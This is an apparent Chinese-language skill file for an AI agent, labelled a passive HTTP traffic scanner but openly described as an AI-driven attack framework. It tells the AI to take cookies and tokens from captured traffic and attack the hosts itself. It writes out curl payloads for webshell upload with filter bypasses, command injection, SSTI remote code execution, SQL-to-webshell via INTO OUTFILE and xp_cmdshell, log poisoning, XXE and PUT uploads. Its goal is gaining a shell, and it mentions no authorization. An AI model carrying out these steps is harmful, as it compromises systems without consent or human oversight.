---
name: loginin-api-scanner
description: >-
  AI驱动的被动漏洞扫描器（XRay风格）。读取BurpSuite/Yakit/浏览器导出的HTTP流量，
  重点识别Critical/High级别漏洞：RCE、SQL注入、SSRF、命令注入、反序列化、SSTI、
  文件上传getshell、认证绕过、越权。默认不输出中低危噪音。触发：被动扫描、流量分析、
  HTTP分析、数据包分析、"帮我分析数据包"、"有没有漏洞"、"分析网站安全性"、
  "被动扫描这份流量"、"审计HTTP流量"。
domain: cybersecurity
subdomain: vulnerability-assessment
tags:
- passive-scanning
- vulnerability-detection
- rce-detection
- http-traffic-analysis
- burpsuite
- evasion
version: 3.2.0
author: security-engineer
license: Apache-2.0
---

# loginin-api-scanner v3.2 — 纯 AI 驱动攻击框架

## 核心原则

**你（AI）亲自执行每一步。** 不做脚本调度器。

```
✅ AI 自己做:  读流量、分析漏洞、发 HTTP 请求、浏览页面、选 payload、上传 shell、验证结果
❌ 不跑脚本:    extract_session / active_explorer / core_engine / selenium_explorer
⚠️ 仅两个例外: parse_http.py (XML解析) / format_report.py (报告格式化)
```

你的武器就是 Bash 的 `curl` + `Read` + 你的推理能力。

---

## 阶段一: 被动漏洞分析

### 1.1 解析流量（唯一必须跑的脚本）

```bash
python3 scripts/parse_http.py <输入文件> -o /tmp/parsed_traffic.json
```

### 1.2 你自己分析流量

**立即用 Read 读取 `/tmp/parsed_traffic.json`**

你自己逐条看请求和响应，对照以下模式判断漏洞。需要参考时读取对应的 reference 文件，不必全读。

**SQL注入判断:**
```
看响应中是否出现这些关键字:
  MySQL:       "You have an error in your SQL syntax" / "mysql_fetch" / "SQLException"
  PostgreSQL:  "PSQLException" / "syntax error at or near"
  MSSQL:       "SqlException" / "Microsoft OLE DB" / "[SQL Server]"
  Oracle:      "ORA-" / "PLS-" / "java.sql.SQLException"
  
如果有 → SQL注入确认 → 至少 High
如果参数值含 ' " -- # UNION SLEEP 但响应无异常 → 不报告（抗幻觉）
```

**命令注入判断:**
```
看响应中是否出现:
  "uid=" / "gid=" / "root:" / "/bin/bash" / ping 输出 / 进程列表 / "x86_64"
  
如果有 → 命令注入确认 → Critical
如果参数名是 cmd/exec/ping 但响应无系统信息 → 不报告
```

**SSRF 判断:**
```
看参数值是否为完整URL (http:// / https://)
看响应中是否包含内网/云元数据:
  "ami-id" / "instance-id" / "computeMetadata" / "169.254.169.254"
  
如果有 → SSRF确认 → 至少 High
```

**SSTI 判断:**
```
看参数值是否含模板语法: {{ }} ${ } #{ } <%= %> <# >
看响应中是否出现 49 (7*7求值) / 配置对象 / 类信息
  
如果有 → SSTI确认 → Critical
```

**反序列化判断:**
```
看请求体是否含序列化特征:
  Java: rO0ABX (base64) / aced0005 (hex)
  PHP:  O:数字: / a:数字:{ / s:数字:"
  .NET: AAEAAAD/////
  
看响应中是否有: "ClassNotFoundException" / "unserialize" / "InvalidClassException"
```

**文件上传判断:**
```
看 Content-Type 是否为 multipart/form-data
看响应中是否返回了文件路径 / URL
看响应中有没有 "不支持" / "invalid type" 等校验错误
  
如果无校验 + 路径已知 → Critical (可上传webshell)
```

**认证/越权判断:**
```
看同一Cookie访问不同资源ID是否都返回200 → IDOR
看直接访问管理接口是否返回200 (不是302/403) → 认证绕过
看JWT header中 alg: none → JWT伪造
```

### 1.3 提取你的武器

分析过程中，顺手收集以下信息（用 Bash 命令提取，不要脚本）:

```bash
# 提取所有 Cookie（按 host 分组）
python3 -c "
import json
with open('/tmp/parsed_traffic.json') as f:
    data = json.load(f)
cookies = {}
for item in data['items']:
    host = item.get('host','')
    c = item.get('request_headers',{}).get('Cookie','')
    if c and host not in cookies:
        cookies[host] = c
for h,c in cookies.items():
    print(f'{h}: {c}')
"

# 提取所有 Authorization 头
python3 -c "
import json
with open('/tmp/parsed_traffic.json') as f:
    data = json.load(f)
for item in data['items']:
    auth = item.get('request_headers',{}).get('Authorization','')
    if auth:
        print(f'{item[\"host\"]}: {auth}')
"

# 列出所有唯一路径（按 host 分组）
python3 -c "
import json
with open('/tmp/parsed_traffic.json') as f:
    data = json.load(f)
paths = {}
for item in data['items']:
    h = item['host']
    if h not in paths: paths[h] = set()
    paths[h].add(item['path'])
for h,ps in sorted(paths.items()):
    print(f'=== {h} ({len(ps)} paths) ===')
    for p in sorted(ps)[:30]: print(f'  {p}')
"

# 识别 POST 请求（表单/上传端点）
python3 -c "
import json
with open('/tmp/parsed_traffic.json') as f:
    data = json.load(f)
for item in data['items']:
    if item['method'] == 'POST':
        ct = item.get('request_headers',{}).get('Content-Type','')
        body = (item.get('request_body') or '')[:200]
        print(f'POST {item[\"url\"]}')
        print(f'  Content-Type: {ct}')
        if body: print(f'  Body: {body}')
        print()
"

# 识别技术栈
python3 -c "
import json
with open('/tmp/parsed_traffic.json') as f:
    data = json.load(f)
tech = set()
for item in data['items']:
    for h in ['Server','X-Powered-By','X-Generator','X-AspNet-Version']:
        v = item.get('response_headers',{}).get(h,'')
        if v: tech.add(f'{h}: {v}')
    cookie = item.get('request_headers',{}).get('Cookie','')
    if 'PHPSESSID' in cookie: tech.add('PHP')
    if 'JSESSIONID' in cookie: tech.add('Java')
    if 'laravel_session' in cookie: tech.add('Laravel')
    if 'csrftoken' in cookie: tech.add('Django')
for t in sorted(tech): print(t)
"
```

### 1.4 判定

```
发现 ≥1 个 Critical/High → 跳到阶段五生成报告
发现 0 个 → 说明流量中没覆盖到高危功能 → 进入阶段二（主动攻击）
```

---

## 阶段二: AI 主动攻击

被动分析没找到高危漏洞。**你现在亲自攻击目标。**

### 2.1 准备认证凭据

从上一步提取的 Cookie/Token 中，选目标 host 的凭据。**记录这些变量**（你自己记住，不要写文件）:

```
TARGET = 从流量中选一个 host（排除 CDN/第三方）
COOKIE = 该 host 的 Cookie 字符串
TOKEN  = 该 host 的 Authorization 头（如果有）
```

### 2.2 探测管理后台

**你自己用 curl 访问后台路径。** 先读 `references/panel-signatures.md` 看路径字典，然后:

```bash
# 逐个路径探测（你手动判断结果）
curl -sk -b "$COOKIE" -o /dev/null -w "%{http_code}" "https://$TARGET/admin"
curl -sk -b "$COOKIE" -o /dev/null -w "%{http_code}" "https://$TARGET/manager"
curl -sk -b "$COOKIE" -o /dev/null -w "%{http_code}" "https://$TARGET/dashboard"

# HTTP 200 → 抓取完整页面分析
curl -sk -b "$COOKIE" "https://$TARGET/admin" > /tmp/admin_page.html
# → Read /tmp/admin_page.html
```

**优先探测流量中已有的路径前缀。** 比如流量中有 `/api/rest/` 就优先探测 `/api/rest/admin` `/api/rest/users`。

### 2.3 分析每个后台页面

**对每个返回 200 的页面，你自己读 HTML 内容并回答:**

```
1. 这是什么功能？
   → 看 <title>、页面标题、面包屑导航

2. 有哪些菜单/模块？
   → 看 <nav>、<ul class="sidebar">、<a href>

3. 有没有文件上传？
   → 搜索: <input type="file" / accept="image" / enctype="multipart"

4. 有没有命令执行功能？
   → 搜索: ping / cmd / exec / shell / 执行 / 运行 / nslookup

5. 有没有 SQL 查询功能？
   → 搜索: sql / query / database / 数据库 / select

6. 有没有模板/代码编辑？
   → 搜索: CodeMirror / Ace / Monaco / template / 模板 / editor

7. 提取更多链接和 API 端点:
   → grep -oP 'href="[^"]*"' | 手动分析
   → grep -oP '["\x27](/api/[^"\x27\s]+)["\x27]' | 手动分析
```

### 2.4 深入 JS 分析（如果页面是 SPA）

如果 curl 返回空壳（`<div id="app">` / `<div id="root">`）:

```bash
# 下载页面引用的 JS 文件
curl -sk -b "$COOKIE" "https://$TARGET/admin" | grep -oP 'src="[^"]+\.js[^"]*"' | sort -u

# 下载关键 JS 并提取 API 端点
curl -sk -b "$COOKIE" "https://$TARGET/wp-content/themes/xxx/app.js" > /tmp/app.js
grep -oP '["\x27](/api/[^"\x27\s]{3,})["\x27]' /tmp/app.js | sort -u
grep -oP '(get|post|put|delete)\s*\(\s*["\x27]([^"\x27]+)["\x27]' /tmp/app.js | sort -u
grep -oP 'url\s*:\s*["\x27]([^"\x27]+)["\x27]' /tmp/app.js | sort -u
```

**如果 JS 渲染太复杂**（大量 Webpack 打包），可降级用脚本:
```bash
python3 scripts/selenium_explorer.py /tmp/session_state.json --target-url "https://$TARGET/admin"
# → 然后 Read /tmp/selenium_traffic.json
```

### 2.5 分类危险功能

分析完所有页面后，你自己整理攻击优先级:

| 发现的功能 | URL | 攻击方式 | 优先级 |
|-----------|-----|---------|:---:|
| 文件上传 | /admin/upload | 上传 webshell | 🔴 P0 |
| Ping 工具 | /admin/ping | 命令注入 | 🔴 P0 |
| 模板编辑 | /admin/template | SSTI→RCE | 🔴 P0 |
| SQL 查询 | /admin/db | SQL→RCE | 🟠 P1 |
| 备份还原 | /admin/backup | 写 webshell | 🟠 P1 |

---

## 阶段三: 精准攻击

**对每个发现的危险功能，你自己选择攻击方式并执行。**

需要 payload 参考时读 `references/active-probe-patterns.md`。

### 3.1 文件上传 → Webshell

```bash
# 1. 查看 webshell 模板
cat templates/tools/php/upload_helper.php

# 2. 上传（带 Cookie） 
curl -sk -b "$COOKIE" \
  -F "file=@templates/tools/php/upload_helper.php" \
  "https://$TARGET/admin/upload"

# 3. 从响应中找上传路径
# 常见: /uploads/ /files/ /images/ /wp-content/uploads/ /assets/

# 4. 逐个路径尝试验证
for path in "/uploads/" "/files/" "/images/" "/"; do
  resp=$(curl -sk "https://$TARGET${path}xxx.php?cmd=echo+ALIVE" 2>/dev/null)
  if echo "$resp" | grep -q "ALIVE"; then
    echo "FOUND: https://$TARGET${path}xxx.php"
    break
  fi
done
```

**上传遇到校验时，你自己尝试绕过:**
- 改扩展名: `.php` → `.phtml` `.php5` `.pHp` `.php.jpg`
- 改 Content-Type: 从 `application/x-php` → `image/jpeg`
- 加合法文件头: `GIF89a;` 前面加 `<?php system($_GET[cmd]);?>`

### 3.2 命令注入 → RCE

```bash
# 对疑似命令执行的参数，逐个测试分隔符
curl -sk -b "$COOKIE" "https://$TARGET/admin/ping?host=127.0.0.1;whoami"
curl -sk -b "$COOKIE" "https://$TARGET/admin/ping?host=127.0.0.1|whoami"  
curl -sk -b "$COOKIE" "https://$TARGET/admin/ping?host=127.0.0.1%0awhoami"
curl -sk -b "$COOKIE" "https://$TARGET/admin/ping?host=127.0.0.1\`whoami\`"
curl -sk -b "$COOKIE" "https://$TARGET/admin/ping?host=127.0.0.1\$(whoami)"

# 看响应中是否有 uid= / root: / /home/ /var/www/ → RCE 确认

# RCE 确认后，写 webshell:
curl -sk -b "$COOKIE" \
  "https://$TARGET/admin/ping?host=127.0.0.1%3becho+'<?php+system(\$_GET[cmd])?>'+>+/var/www/html/s.php"
```

### 3.3 SSTI → RCE

```bash
# 验证: 数学运算
curl -sk -b "$COOKIE" -d "content={{7*7}}" "https://$TARGET/admin/template/save"
# 如果响应中出现 49 → SSTI 确认
# 如果响应中出现 config / __class__ → 可能 RCE

# 按引擎执行:
# Jinja2 (Flask):
curl -sk -b "$COOKIE" -d "content={{cycler.__init__.__globals__.os.popen('id').read()}}" "https://$TARGET/admin/template/save"

# Twig (Symfony):
curl -sk -b "$COOKIE" -d "content={{['id']|filter('system')}}" "https://$TARGET/admin/template/save"

# Freemarker (Java):
curl -sk -b "$COOKIE" -d 'content=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' "https://$TARGET/admin/template/save"
```

### 3.4 SQL执行 → RCE

```bash
# 查版本和权限
curl -sk -b "$COOKIE" "https://$TARGET/admin/db?sql=SELECT+@@version"
curl -sk -b "$COOKIE" "https://$TARGET/admin/db?sql=SELECT+user()"
curl -sk -b "$COOKIE" "https://$TARGET/admin/db?sql=SELECT+@@secure_file_priv"

# MySQL INTO OUTFILE → webshell:
curl -sk -b "$COOKIE" "https://$TARGET/admin/db?sql=SELECT+'<?php+system(\$_GET[cmd])?>'+INTO+OUTFILE+'/var/www/html/x.php'"

# MSSQL xp_cmdshell:
curl -sk -b "$COOKIE" "https://$TARGET/admin/db?sql=EXEC+sp_configure+'xp_cmdshell',1%3BRECONFIGURE%3BEXEC+xp_cmdshell+'whoami'"
```

### 3.5 其他攻击向量

```bash
# LFI + Log Poisoning
curl -sk -H "User-Agent: <?php system(\$_GET[cmd]);?>" "https://$TARGET/"
curl -sk -b "$COOKIE" "https://$TARGET/admin/view?file=/var/log/apache2/access.log&cmd=id"

# XXE
curl -sk -b "$COOKIE" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
  "https://$TARGET/api/xml"

# HTTP PUT 上传
curl -sk -b "$COOKIE" -X PUT -d '<?php system($_GET[cmd]);?>' "https://$TARGET/shell.php"

# 反序列化探测
curl -sk -b "$COOKIE" -d 'O:8:"stdClass":0:{}' "https://$TARGET/api/data"
```

---

## 阶段四: 验证攻击结果

```bash
# 通过 webshell 收集信息
curl -sk "https://$TARGET/shell.php?cmd=whoami"
curl -sk "https://$TARGET/shell.php?cmd=id"
curl -sk "https://$TARGET/shell.php?cmd=hostname"
curl -sk "https://$TARGET/shell.php?cmd=ifconfig"
curl -sk "https://$TARGET/shell.php?cmd=ps+aux|head+-20"
curl -sk "https://$TARGET/shell.php?cmd=cat+/etc/passwd"

# 如果部署了多个 webshell，可以用脚本管理
python3 scripts/session_manager.py check /tmp/attack_results.json
python3 scripts/session_manager.py exec /tmp/attack_results.json --cmd "whoami;id;uname -a"
```

**攻击成功标准**: 能执行系统命令 → 目标已控制 → 进入阶段五。

---

## 阶段五: 生成报告

```bash
# 把你发现的所有漏洞整理成 findings.json（按 references/report-schema.md 格式）
# 然后用脚本格式化
python3 scripts/format_report.py /tmp/findings.json -o /tmp/report.md
```

---

## 辅助脚本索引（极少使用）

| 脚本 | 用途 | 何时用 |
|------|------|--------|
| `parse_http.py` | 解析 Burp XML | **必须**——AI 解不了 base64+XML |
| `format_report.py` | 格式化报告 | 最后一步 |
| `extract_session.py` | 批量提取凭据 | 流量超过 500 条时，手动提取太慢 |
| `active_explorer.py` | 批量探测路径 | 目标有 50+ 候选路径时 |
| `selenium_explorer.py` | JS 渲染 | SPA 页面 JS 太复杂无法手动分析时 |
| `core_engine.py` | 批量尝试 exploit | 已确认漏洞，想自动化利用 |
| `session_manager.py` | 交互式 Shell | 已拿到 webshell，想方便地执行命令 |

**原则**: 能用 curl + Read 的就不要跑脚本。脚本是最后手段。

---

## 输出规则

| 条件 | 行为 |
|------|------|
| 默认 | **仅输出 Critical + High** |
| 用户说 "完整报告" | 输出全部级别 |
| 0 个 Critical/High | 告诉用户，询问是否主动攻击 |

## 文件结构

```
loginin-api-scanner/
├── SKILL.md                          # 本文件 — AI 攻击指令
├── README.md
├── scripts/                          # 辅助脚本（尽量不用）
│   ├── parse_http.py                 # XML 解析
│   ├── format_report.py              # 报告生成
│   └── ...                           # 其他辅助
├── templates/                        # Webshell 模板（cat 即用）
│   ├── tools/php/  (cmd型, 免杀)
│   ├── tools/jsp/  (cmd型, hex反射)
│   ├── tools/aspx/ (cmd型)
│   ├── tools/asp/  (cmd型)
│   └── tools/python/
└── references/                       # 参考（按需 Read）
    ├── critical-vuln-patterns.md
    ├── vulnerability-patterns.md
    ├── active-probe-patterns.md
    ├── panel-signatures.md
    └── report-schema.md
```

## 核心要点

1. **你亲自攻击**: curl 发请求 → 读响应 → 分析 → 选 payload → 攻击 → 验证
2. **脚本是辅助**: XML 解析和报告生成才用脚本
3. **先被动后主动**: 流量分析不到漏洞才主动攻击
4. **上下文决策**: 看完页面功能再选攻击方式，不盲打
5. **拿到 shell 就停**: 能执行系统命令 = 目标已控制 = 成功
